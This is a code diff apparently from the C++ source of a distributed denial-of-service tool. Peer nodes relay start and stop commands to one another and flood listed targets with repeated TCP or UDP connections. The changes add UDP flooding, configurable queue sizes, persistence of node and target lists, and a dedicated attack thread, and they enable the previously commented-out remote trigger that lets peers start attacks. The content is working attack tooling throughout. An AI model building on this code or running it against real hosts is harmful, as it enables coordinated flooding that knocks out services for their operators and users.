@@ -17,9 +17,9 @@ void attack::new_target(attack::node& node, string target) {
 		if (valid) {
 			attack::target this_target;
 			this_target.IP = target_ip;
-			
+
 			this_target.port = atoi(target.substr(i+1).c_str());
-		
+
 			#pragma omp critical
 			node.targets.push_back(this_target);
 
@@ -40,7 +40,7 @@ void attack::new_node(vector<string>& nodes, string node) {
 	if (valid) {
 		#pragma omp critical
 		nodes.push_back(node);
-		
+
 		#pragma omp parallel for
 		for (unsigned i = 0; i < nodes.size()-1; i++)
 			propagate(nodes[i],2,node);
@@ -48,6 +48,30 @@ void attack::new_node(vector<string>& nodes, string node) {
 	}
 }
 void attack::initialize(attack::node& node) {
+	fstream file;
+	string line;
+
+	file.open("nodes",fstream::in);
+	while(getline(file,line))
+		node.nodes.push_back(line);
+	file.close();
+
+	file.open("targets",fstream::in);
+
+	target input;
+	char stream;
+	while(!file.eof()) {
+		file >> input.IP;
+		if (input.IP.empty())
+			break;
+		file >> input.port;
+		file >> stream;
+		input.stream = stream != 'U';
+		node.targets.push_back(input);
+	}
+	file.close();
+
+
 	#pragma omp parallel shared(node)
 	{
 		#pragma omp sections nowait
@@ -57,6 +81,9 @@ void attack::initialize(attack::node& node) {
 
 			#pragma omp section
 			get_commands(node);
+
+			#pragma omp section
+			attack(node);
 		}
 	}
 }
@@ -65,66 +92,106 @@ void attack::start_attack(attack::node& starter) {
 	for (unsigned i = 0; i < starter.nodes.size(); i++)
 		propagate(starter.nodes[i],0);
 
+	#pragma omp critical
 	starter.attacking = true;
+}
+void attack::attack(attack::node& starter) {
+	bool alive = true, attack = false;
+	while (alive) {
+		if (attack) {
+			int sockets[starter.queue];
+			time_t t_sockets[starter.queue];
+			struct sockaddr_in address;
 
-	int sockets[20];
-	time_t t_sockets[20];
-	struct sockaddr_in address;
-	#pragma omp parallel for private(sockets, t_sockets, address)
-	for (unsigned i = 0; i < starter.targets.size(); i++) {
-		get_address(starter.targets[i].IP, starter.targets[i].port, &address);
-		
-		long closing = 0;
-		
-		for (long j = 0; true;) {
-			sockets[j] = socket(AF_INET, SOCK_STREAM, 0);
-			time(&t_sockets[j]);
-			
-			if (difftime(t_sockets[j], t_sockets[closing]) >= 3) {
-				cout << "closing " << closing << ":" << sockets[closing] << "\n";
-				close(sockets[closing]);
-				sockets[closing] = -1;
-				closing++;
-				if (closing == 20)
-					closing = 0;
+			#pragma omp parallel for private(sockets, t_sockets, address)
+			for (unsigned i = 0; i < starter.targets.size(); i++) {
+				get_address(starter.targets[i].IP, starter.targets[i].port, &address);
+
+				long closing = 0;
+
+				for (long j = 0; attack;) {
+					if (starter.targets[i].stream)
+						sockets[j] = socket(AF_INET, SOCK_STREAM, 0);
+					else
+						sockets[j] = socket(AF_INET, SOCK_DGRAM, 0);
+					time(&t_sockets[j]);
+
+					if (difftime(t_sockets[j], t_sockets[closing]) >= starter.wait) {
+						cout << "closing " << closing << ":" << sockets[closing] << "\n";
+						close(sockets[closing]);
+						sockets[closing] = -1;
+						closing++;
+						if (closing == starter.queue)
+							closing = 0;
+					}
+
+					cout << j << ":" << sockets[j] << "\n";
+					if (connect(sockets[j], (struct sockaddr*) &address, sizeof(address)) == -1)
+						sockets[j] = -1;
+
+					if (j == starter.queue-1)
+						j = 0;
+					else
+						j++;
+
+					#pragma omp critical
+					attack = starter.attacking;
+				}
+
+
+				for (long j = 0; j < starter.queue; j++)
+					if (sockets[j] != -1)
+						close(sockets[j]);
 			}
-		
-			cout << j << ":" << sockets[j] << "\n";
-			if (connect(sockets[j], (struct sockaddr*) &address, sizeof(address)) == -1)
-				sockets[j] = -1;
-
-			if (j == 19)
-				j = 0;
-			else
-				j++;
-
-			if (!starter.attacking)
-				break;
+			cout << "DONE\n";
 		}
 
+		#pragma omp critical
+		alive = starter.active;
 
-		for (long j = 0; j < 20; j++)
-			if (sockets[j] != -1)
-				close(sockets[j]);
+		#pragma omp critical
+		attack = starter.attacking;
 	}
-	cout << "DONE\n";
 }
 void attack::stop_attack(attack::node& starter) {
+	#pragma omp critical
 	starter.attacking = false;
+
 	#pragma omp parallel for
 	for (unsigned i = 0; i < starter.nodes.size(); i++)
 		propagate(starter.nodes[i],1);
 }
 void attack::terminate(attack::node& node) {
+	fstream file;
+
+	file.open("nodes",fstream::out | fstream::trunc);
+	for (unsigned i = 0; i < node.nodes.size(); i++)
+		file << node.nodes[i] << endl;
+	file.close();
+
+	file.open("targets",fstream::out | fstream::trunc);
+
+	for (unsigned i = 0; i < node.targets.size(); i++) {
+		file << node.targets[i].IP << " " << node.targets[i].port;
+		if (node.targets[i].stream)
+			file << " T\n";
+		else
+			file << " U\n";
+	}
+	file.close();
+
 	#pragma omp critical
 	node.active = false;
+
+	exit(0);
 }
 void attack::get_commands(attack::node& node) {
 	system("clear");
 	cout << "- [A]ttack\n- [S]top\n- Add [T]arget\n- Add [N]ode\n- [L]ist Nodes\n- L[i]st Targets\n- [R]emove Node\n- R[e]move Target\n[Q]uit\n";
 	char input;
 	string msg;
-	while(true) {
+	bool alive = true;
+	while(alive) {
 		cout << "\n:";
 		cin >> input;
 
@@ -169,7 +236,7 @@ void attack::get_commands(attack::node& node) {
 			case 'i':
 			case 'I':
 				for (unsigned i = 0; i < node.targets.size(); i++)
-					cout << "\t[" << i << "]: " << node.targets[i].IP << ":" << node.targets[i].port << "\n";
+					cout << "\t[" << i << "]: " << node.targets[i].IP << ":" << node.targets[i].port << (node.targets[i].stream ? " TCP\n" : " UDP\n");
 				break;
 			case 'r':
 			case 'R':
@@ -192,10 +259,13 @@ void attack::get_commands(attack::node& node) {
 				}
 				break;
 		}
+
+		#pragma omp critical
+		alive = node.active;
 	}
 }
 void attack::listen(attack::node& node) {
-	int this_socket = socket(AF_INET,SOCK_DGRAM,0);
+	int this_socket = socket(AF_INET,SOCK_STREAM,0);
 
 	struct sockaddr_in address;
 	address.sin_family = AF_INET;
@@ -210,8 +280,8 @@ void attack::listen(attack::node& node) {
 		uint8_t buffer[64];
 		struct sockaddr_in client;
 		unsigned length;
-		bool valid = false;
-		while (true) {
+		bool valid = false, alive = true;
+		while (alive) {
 			length = sizeof(client);
 			
 			connection = accept(this_socket, (struct sockaddr*) &client, &length);
@@ -227,12 +297,12 @@ void attack::listen(attack::node& node) {
 				switch(buffer[0]) {
 					case 8:
 						if (bytes == 1)
-//							start_attack(node);
+							start_attack(node);
 						cout << "START\n";
 						break;
 					case 9:
 						if (bytes == 1)
-//							stop_attack(node);
+							stop_attack(node);
 						cout << "STOP\n";
 						break;
 					case 10:
@@ -246,11 +316,10 @@ void attack::listen(attack::node& node) {
 
 			close(connection);
 
-			if (!node.active) {
-				close(this_socket);
-				break;
-			}
+			#pragma omp critical
+			alive = node.active;
 		}
+		close(this_socket);
 	} else {
 		cerr << "LISTEN: could not bind. " << strerror(errno) << "\n";
 		exit(1);
@@ -282,10 +351,10 @@ void attack::propagate(string node, char type, string message) {
 }
 int attack::get_address(string name, short port, struct sockaddr_in* address) {
 	struct hostent *host;
-	if (host = gethostbyname(name.c_str())) {
+	if ((host = gethostbyname(name.c_str()))) {
 		address->sin_family = AF_INET;
 		address->sin_port = htons(port);
-		address->sin_addr = *((struct in_addr*)host->h_addr);
+		address->sin_addr.s_addr = ((struct in_addr*)host->h_addr)->s_addr;
 
 		memset(&(address->sin_zero),0,8);
 		return -1;
